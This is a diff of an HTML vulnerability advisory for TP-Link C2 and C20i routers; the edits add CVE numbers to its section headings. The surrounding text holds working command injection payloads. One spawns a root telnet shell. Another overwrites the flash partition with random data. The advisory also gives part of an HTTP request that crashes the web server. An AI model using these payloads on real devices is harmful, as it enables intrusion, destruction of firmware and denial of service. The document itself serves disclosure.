@@ -45,7 +45,7 @@ h1, h2, h3, h4 {
 <h2>Vulnerabilities Summary</h2>
 <p>Command Injections exist in the HTTP management interface up to the latest firmware version (0.9.1 4.2 v0032.0 Build 160706 Rel.37961n) of TP-Link C2 and C20i, allowing an authenticated attacker to get a remote shell with root privileges.</p>
 <p>An attacker can DoS the httpd server and the firewall rules are too permissive by default on the WAN interface.</p>
-<h2>Details - RCE with a single HTTP request</h2>
+<h2>Details - CVE-2017-8220 - RCE with a single HTTP request</h2>
 <p>Using the so-called "Diagnostic" page, the attacker can run any command including telnetd, using the remote host field of the ping utility:</p>
 <pre><code>$(echo 127.0.0.1; /usr/sbin/telnetd -l bin/sh -p 25)
 </code></pre>
@@ -221,7 +221,7 @@ host=$(echo 127.0.0.1; cat /dev/random &gt; /dev/mtd0)
 X_TP_ConnName=ewan_ipoe_d
 diagnosticsState=Requested
 </code></pre>
-<h2>Details - DoSing the HTTP server</h2>
+<h2>Details - CVE-2017-8219 - DoSing the HTTP server</h2>
 <p>While being authenticated (see the credentials in base64 format), sending this HTTP request directly will crash the remote HTTP server:</p>
 <pre><code>GET /cgi/ansi HTTP/1.1
 Host: 192.168.1.1
@@ -250,7 +250,7 @@ drwxr-xr-x   13       177 ..
 drwxr-xr-x   13         0 .
 /var #
 </code></pre>
-<h2>Details - Permissive Iptables rules</h2>
+<h2>Details - CVE-2017-8217 - Permissive Iptables rules</h2>
 <p>The default iptables rules are generated within <code>/lib/libcmm.so</code> by writing commands inside <code>/var/tmp/dconf/rc.router</code> and using <code>system()</code> on this file.</p>
 <p><code>/var/tmp/dconf/rc.router</code>:</p>
 <pre><code>#!/bin/sh
@@ -275,7 +275,7 @@ ACCEPT     udp  --  0.0.0.0/0            0.0.0.0/0            udp dpt:161
 <p>You can check too by reading the file <code>/var/tmp/dconf/rc.router</code>.</p>
 <p>Luckily, even if SNMP configuration can be modified using the hidden <code>/main/snmp.html</code> webpage,
 it appears the snmpd has been removed from the firmware image.</p>
-<h2>Details - Misc</h2>
+<h2>Details - CVE-2017-8218 - Misc</h2>
 <p>The binaries (<code>/usr/bin/cos</code>, <code>/usr/bin/tmpd</code>, <code>/lib/libcmm.so</code>) are overall badly designed programs, executing tons of <code>system()</code> and running as root.</p>
 <p><code>/usr/bin/cos</code> is a daemon running as root and is launched at the end of <code>/etc/init.d/rcS</code> (<code>cos &amp;</code>): it starts all the daemons using system (httpd ntpc dnsProxy dhcpd dhcpc snmpd upnpd diagTool voip_server voip_client pjsua cwmp wlNetlinkTool pppd dyndns igmpd zebra ushare smbd vsftpd telnetd, noipdns hostapd ipsecVpn radvd mldProxy racoon wscd...)</p>
 <p><code>/usr/bin/tmpd</code> is a daemon running as root and listens to <code>127.0.0.1:20002</code>.</p>
